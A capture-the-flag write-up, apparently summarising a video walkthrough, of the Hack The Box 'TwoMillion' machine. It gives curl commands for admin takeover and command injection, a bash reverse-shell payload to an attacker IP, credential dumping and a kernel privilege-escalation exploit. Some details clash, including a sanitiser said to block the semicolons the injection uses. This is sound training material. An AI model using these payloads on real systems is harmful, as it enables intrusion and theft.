## Initial Reconnaissance & Enumeration

The initial phase involves scanning the target to identify open ports and services, then gathering basic web application information.

### Nmap Scan

The presenter starts with a full port scan to quickly identify all open ports, followed by a more detailed scan on the identified ports:

1.  **Full Port Scan:**

    ```bash
    nmap -p- --min-rate 10000 -oA 2million_all_ports -v 10.10.11.221
    ```

      * `-p-`: Scans all ports (1-65535).
      * `--min-rate 10000`: Sends packets at a minimum rate of 10,000 packets per second for speed.
      * `-oA 2million_all_ports`: Outputs results in all major formats with the base name `2million_all_ports`.
      * `-v`: Increases verbosity.
      * `10.10.11.221`: The IP address of the target machine.

    This scan quickly reveals ports 22 (SSH) and 80 (HTTP) are open.

2.  **Detailed Port Scan:**

    ```bash
    nmap -sC -sV -oA 2million -p 22,80 10.10.11.221
    ```

      * `-sC`: Performs a script scan using default scripts.
      * `-sV`: Probes open ports to determine service/version information.
      * `-p 22,80`: Specifies to scan only ports 22 and 80.

### Web Enumeration & Hosts File Update

Accessing the web server on port 80 reveals a redirect.

1.  **Browser Access:**
    Navigate to `http://10.10.11.221`. The site redirects to `2million.htb`.

2.  **Update Hosts File:**
    Add the domain to your `/etc/hosts` file to resolve the hostname:

    ```bash
    sudo vi /etc/hosts
    # Add:
    10.10.11.221 2million.htb
    ```

3.  **Directory Busting with Ffuf (or Fairobuster as used in video):**
    The video uses Fairobuster; however, `ffuf` is a more modern and generally faster alternative.

    ```bash
    ffuf -u http://2million.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
    ```

      * `-u http://2million.htb/FUZZ`: Specifies the target URL and where to insert wordlist entries.
      * `-w /usr/share/wordlists/dirb/common.txt`: Specifies the wordlist to use.

    This runs in the background to find hidden directories and files.

## Initial Web Application Interaction

The website resembles an old Hack The Box platform. The presenter investigates login and registration functionalities.

### Login Attempts

Attempting to log in with common credentials and emails:

  * `admin@2million.htb` with `password` -\> `User not found`
  * `admin@hackthebox.eu` with `password` -\> `User not found`

### Registration and Invite Code

The "Join HTB" link leads to a page requiring an invite code.

1.  **Analyze `inviteman.js`:**
    Using browser developer tools (Network tab), identify `inviteman.js` being loaded. Examine its content. The script reveals two functions: `verifyInviteCode` and `makeInviteCode`.

2.  **Generate Invite Code:**
    The `makeInviteCode` function makes a `POST` request to `/api/v1/generate`.

    ```bash
    curl -X POST http://2million.htb/api/v1/generate | jq .
    ```

    The JSON response contains an encoded invite code and the encoding method (ROT13, then Base64).

3.  **Decode Invite Code (using CyberChef or command line):**
    The response will look something like this:

    ```json
    {
      "success": true,
      "data": {
        "code": "SomeBase64EncodedString",
        "encoding": "ROT13",
        "description": "In order to generate the invite code, make a POST request to /api/v1/generate"
      }
    }
    ```

    To decode the `code`:

    ```bash
    INVITE_CODE_B64=$(curl -s -X POST http://2million.htb/api/v1/generate | jq -r '.data.code')
    echo "$INVITE_CODE_B64" | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    ```

      * `jq -r '.data.code'`: Extracts the `code` value as raw text.
      * `base64 -d`: Decodes from Base64.
      * `tr 'A-Za-z' 'N-ZA-Mn-za-m'`: Performs ROT13 decoding.

    This reveals the valid invite code.

4.  **Register a New Account:**
    Use the obtained invite code to register a new account on the "Join HTB" page.

      * **Username:** `ipsec` (or any desired username)
      * **Email:** `root@ipsec.rocks`
      * **Password:** `password`

## Web Application Vulnerabilities & Initial Shell

After logging in, the presenter explores functionalities for further access.

### Privilege Escalation via Mass Assignment (Failed)

The presenter attempts to elevate privileges during registration using a mass assignment vulnerability.

1.  **Intercept Registration Request (Burp Suite):**
    During registration, intercept the `POST` request to `/api/v1/register`.

2.  **Add `is_admin` Parameter:**
    Add `is_admin=1` to the request body.

      * **Request Body Example:** `username=ipsec&email=admin@ipsec.rocks&password=password&code=INVITE_CODE&is_admin=1`

3.  **Forward Request & Verify:**
    Forward the request and then check the `/api/v1/user/auth` endpoint or the profile page to see if admin privileges were granted. (In the video, this attempt fails, `is_admin` remains `0`).

### Privilege Escalation via IDOR and `is_admin` Update

An Insecure Direct Object Reference (IDOR) combined with a mass assignment-like vulnerability is found on the update user settings endpoint.

1.  **Identify Update Endpoint:**
    The API routes (found by `curl http://2million.htb/api/v1 | jq .`) show `/api/v1/user/settings/update` with a `PUT` method.

2.  **Intercept Update Request (Burp Suite):**
    Navigate to the user settings page (if available) or craft a `PUT` request to `/api/v1/user/settings/update`.

3.  **Modify Request to Gain Admin:**
    The endpoint expects JSON. Send a `PUT` request with `Content-Type: application/json` and a JSON body containing `{"email": "your_registered_email@example.com", "is_admin": 1}`.

    ```bash
    curl -X PUT http://2million.htb/api/v1/user/settings/update \
      -H 'Content-Type: application/json' \
      -H 'Cookie: PHPSESSID=<your_php_session_id>' \
      -d '{"email":"admin@ipsec.rocks","is_admin":1}'
    ```

      * Replace `<your_php_session_id>` with your active `PHPSESSID` cookie.

4.  **Verify Admin Status:**
    Check the `/api/v1/admin/auth` endpoint.

    ```bash
    curl -X GET http://2million.htb/api/v1/admin/auth \
      -H 'Cookie: PHPSESSID=<your_php_session_id>' | jq .
    ```

    If `true`, you are now an administrator.

### Command Injection in VPN Generation

As an administrator, the `/api/v1/admin/vpn/generate` endpoint is accessible. This endpoint appears vulnerable to command injection through the `username` parameter.

1.  **Test for Command Injection:**
    Send a `POST` request to `/api/v1/admin/vpn/generate` with a `username` parameter that includes a time-based command injection payload.

    ```bash
    curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
      -H 'Content-Type: application/json' \
      -H 'Cookie: PHPSESSID=<your_php_session_id>' \
      -d '{"username":"test; sleep 5;"}'
    ```

    If the response is delayed by 5 seconds, command injection is confirmed.

2.  **Establish a Reverse Shell:**
    Set up a Netcat listener on your attacking machine:

    ```bash
    nc -lvnp 9001
    ```

    Send a `POST` request to `/api/v1/admin/vpn/generate` with a reverse shell payload in the `username` parameter.

    ```bash
    curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
      -H 'Content-Type: application/json' \
      -H 'Cookie: PHPSESSID=<your_php_session_id>' \
      -d '{"username":"ipsec; bash -c \"bash -i >& /dev/tcp/10.10.14.8/9001 0>&1\""}'
    ```

      * Replace `10.10.14.8` with your attacking machine's IP address.
      * `ipsec;`: A dummy username followed by the command injection.

    Upon execution, you should receive a shell on your Netcat listener.

### Shell Upgrade

Upgrade the shell to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background nc
stty raw -echo; fg
export TERM=xterm
clear
```

## Local Enumeration & Privilege Escalation

Once on the machine, the goal is to escalate privileges to `root`.

### Database Credentials

Check environment variables or configuration files for database credentials.

```bash
env | grep DB
```

This reveals `DB_USERNAME=admin` and `DB_PASSWORD=super_duper_pass`.

### MySQL Database Access

Connect to the MySQL database using the discovered credentials.

```bash
mysql -u admin -p
# Enter 'super_duper_pass' when prompted
```

Inside MySQL:

```sql
SHOW DATABASES;
USE htb_prod;
SHOW TABLES;
SELECT * FROM users;
```

This reveals hashed passwords for `trx` and `cybergreek` users.

### User Enumeration

Check `/etc/passwd` for valid system users.

```bash
cat /etc/passwd | grep /bin/bash
```

This shows an `admin` user with a bash shell.

### Checking for `admin`'s Mail

The mail for the `admin` user provides a crucial hint for privilege escalation.

```bash
cat /var/mail/admin
```

The email contains a message mentioning an "overlay FS" Linux kernel CVE from 2022.

### Kernel Exploitation (CVE-2023-0386)

The kernel version (e.g., from `uname -a`) and the mail hint point to a local privilege escalation vulnerability related to OverlayFS. The video identifies CVE-2023-0386.

1.  **Download Exploit:**
    Download the proof-of-concept (POC) for CVE-2023-0386 from a reliable source (e.g., Exploit-DB, GitHub).

    ```bash
    wget http://<your_ip>:8000/CVE-2023-0386.tar.bz2
    # Ensure you are running a Python HTTP server on your attacker machine:
    # python3 -m http.server 8000
    ```

2.  **Extract and Compile:**

    ```bash
    tar xjf CVE-2023-0386.tar.bz2
    cd CVE-2023-0386
    make
    ```

      * Ensure `gcc` is available on the target system for compilation.

3.  **Execute Exploit:**
    Run the compiled exploit:

    ```bash
    ./exploit
    ```

    This should grant you a root shell.

4.  **Retrieve Root Flag:**

    ```bash
    cd /root
    cat root.txt
    ```

### Beyond Root (Analyzing `thankyou.json` and Regex)

The video also explores some "Beyond Root" steps:

1.  **Analyze `thankyou.json`:**
    In `/root`, there's a `thankyou.json` file.

    ```bash
    cat /root/thankyou.json | jq .
    ```

    The content is heavily encoded (URL-encoded, Hex-encoded, XOR-encrypted with key "hack the box", and Base64-encoded). Use CyberChef or similar tools to decode it.

2.  **Investigate `admin/vpn/generate` Code:**
    After gaining root, the presenter examines the PHP code for the `admin/vpn/generate` endpoint to understand why direct command injection via `username` during registration failed. They find that the `removeSpecialCharacters` function uses a regular expression to sanitize input, preventing common command injection characters like pipes (`|`), semicolons (`;`), and backticks (`` ` ``).